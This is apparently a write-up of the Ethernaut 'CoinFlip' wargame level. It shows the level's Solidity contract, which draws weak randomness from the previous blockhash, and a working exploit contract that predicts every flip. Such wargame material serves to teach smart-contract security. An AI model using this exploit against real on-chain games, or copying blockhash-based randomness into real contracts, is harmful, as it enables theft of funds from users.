### Description:

This is a coin flipping game where you need to build up your winning streak by guessing the outcome of a coin flip. To complete this level you'll need to use your psychic abilities to guess the correct outcome 10 times in a row.

  Things that might help

- See the ["?"](https://ethernaut.openzeppelin.com/help) page above in the top right corner menu, section "Beyond the console"

### Contract

```js
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

contract CoinFlip {

  uint256 public consecutiveWins;
  uint256 lastHash;
  uint256 FACTOR = 57896044618658097711785492504343953926634992332820282019728792003956564819968;

  constructor() {
    consecutiveWins = 0;
  }

  function flip(bool _guess) public returns (bool) {
    uint256 blockValue = uint256(blockhash(block.number - 1));

    if (lastHash == blockValue) {
      revert();
    }

    lastHash = blockValue;
    uint256 coinFlip = blockValue / FACTOR;
    bool side = coinFlip == 1 ? true : false;

    if (side == _guess) {
      consecutiveWins++;
      return true;
    } else {
      consecutiveWins = 0;
      return false;
    }
  }
}
```


### Exploitation
```js
contract HackFlip {

CoinFlip private immutable target;

uint256 FACTOR = 57896044618658097711785492504343953926634992332820282019728792003956564819968;

constructor(address _target){

target = CoinFlip(_target);

}

  

function flip() external {

bool guess = _guess();

require(target.flip(guess), "Failed!!!");

}

function _guess() private view returns (bool) {

uint256 blockValue = uint256(blockhash(block.number - 1));

uint256 coinFlip = blockValue / FACTOR;

bool side = coinFlip == 1 ? true : false;

return side;

}

}
```